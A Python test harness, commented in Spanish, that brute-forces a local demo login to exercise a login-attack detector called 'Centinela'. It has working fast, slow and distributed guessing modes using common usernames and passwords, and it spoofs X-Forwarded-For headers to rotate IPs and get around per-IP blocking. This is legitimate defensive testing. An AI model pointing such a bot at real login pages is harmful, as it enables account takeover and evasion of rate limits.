"""
bot_ataque.py

Bot de fuerza bruta reutilizable. Ataca el LOGIN DEMO (puerto 5000, el
sistema que "alguien más" tiene), no al detector directamente -- así se
prueba la integración completa de punta a punta, tal como pasaría con
un atacante real contra un sitio protegido por Centinela.

USO:
    python bot_ataque.py --tipo rapido
    python bot_ataque.py --tipo lento
    python bot_ataque.py --tipo distribuido
    python bot_ataque.py --tipo rapido --usuario carla
    python bot_ataque.py --tipo rapido --url http://localhost:5000/login

Requiere que estén corriendo, en este orden:
    1. python app.py                (Centinela, puerto 5050)
    2. python app_login_demo.py     (login demo, puerto 5000)
"""
import argparse
import random
import time
import requests

USUARIOS_COMUNES = ["admin", "carla", "roberto", "root", "test"]
PASSWORDS_COMUNES = ["123456", "password", "admin123", "qwerty",
                      "letmein", "12345678", "root", "changeme"]


def _ip_aleatoria():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _intentar(url, ip, usuario, password):
    try:
        r = requests.post(url, json={"usuario": usuario, "password": password},
                           headers={"X-Forwarded-For": ip}, timeout=3)
        try:
            mensaje = r.json().get("mensaje", "")
        except Exception:
            mensaje = ""
        return r.status_code, mensaje
    except requests.exceptions.RequestException as e:
        return None, str(e)


def ataque_rapido(url, usuario=None, num_intentos=10, intervalo=0.3):
    usuario = usuario or random.choice(USUARIOS_COMUNES)
    ip = _ip_aleatoria()
    print(f"\n[ATAQUE RÁPIDO] ip={ip} usuario={usuario} ({num_intentos} intentos, "
          f"{intervalo}s entre cada uno)")
    for i in range(1, num_intentos + 1):
        pwd = random.choice(PASSWORDS_COMUNES)
        codigo, mensaje = _intentar(url, ip, usuario, pwd)
        print(f"  intento {i:2d}: password='{pwd:12s}' -> HTTP {codigo}  {mensaje}")
        if codigo == 403:
            print(f"  >>> BLOQUEADO en el intento {i}. Deteniendo ataque.")
            break
        time.sleep(intervalo)


def ataque_lento(url, usuario=None, num_intentos=10, intervalo=2.0):
    usuario = usuario or random.choice(USUARIOS_COMUNES)
    ip = _ip_aleatoria()
    print(f"\n[ATAQUE LENTO] ip={ip} usuario={usuario} ({num_intentos} intentos, "
          f"{intervalo}s entre cada uno)")
    for i in range(1, num_intentos + 1):
        pwd = random.choice(PASSWORDS_COMUNES)
        codigo, mensaje = _intentar(url, ip, usuario, pwd)
        print(f"  intento {i:2d}: password='{pwd:12s}' -> HTTP {codigo}  {mensaje}")
        if codigo == 403:
            print(f"  >>> BLOQUEADO en el intento {i}. Deteniendo ataque.")
            break
        time.sleep(intervalo)


def ataque_distribuido(url, usuario=None, num_ips=6, intervalo=0.2):
    usuario = usuario or random.choice(USUARIOS_COMUNES)
    print(f"\n[ATAQUE DISTRIBUIDO] usuario={usuario} ({num_ips} IPs distintas, "
          f"1 intento cada una)")
    for i in range(1, num_ips + 1):
        ip = _ip_aleatoria()
        pwd = random.choice(PASSWORDS_COMUNES)
        codigo, mensaje = _intentar(url, ip, usuario, pwd)
        print(f"  IP {i}/{num_ips} ({ip}): password='{pwd:12s}' -> HTTP {codigo}  {mensaje}")
        if codigo == 403:
            print(f"  >>> Esta IP fue bloqueada, pero el ataque sigue con nuevas IPs "
                  f"(así es como el ataque distribuido intenta evadir el bloqueo por IP)")
        time.sleep(intervalo)


def main():
    parser = argparse.ArgumentParser(description="Bot de fuerza bruta reutilizable para pruebas")
    parser.add_argument("--tipo", choices=["rapido", "lento", "distribuido"],
                         default="rapido", help="Tipo de ataque a simular")
    parser.add_argument("--url", default="http://localhost:5000/login",
                         help="URL del login a atacar (default: login demo en :5000)")
    parser.add_argument("--usuario", default=None,
                         help="Usuario objetivo (default: aleatorio entre los comunes)")
    parser.add_argument("--intentos", type=int, default=10,
                         help="Número de intentos (solo para rápido/lento)")
    parser.add_argument("--ips", type=int, default=6,
                         help="Número de IPs distintas (solo para distribuido)")
    args = parser.parse_args()

    print("=" * 60)
    print(f"Bot de ataque -> objetivo: {args.url}")
    print("=" * 60)

    if args.tipo == "rapido":
        ataque_rapido(args.url, args.usuario, args.intentos)
    elif args.tipo == "lento":
        ataque_lento(args.url, args.usuario, args.intentos)
    else:
        ataque_distribuido(args.url, args.usuario, args.ips)

    print("\nAtaque finalizado. Revisa el dashboard de Centinela en "
          "http://localhost:5050 para ver el detalle.\n")


if __name__ == "__main__":
    main()
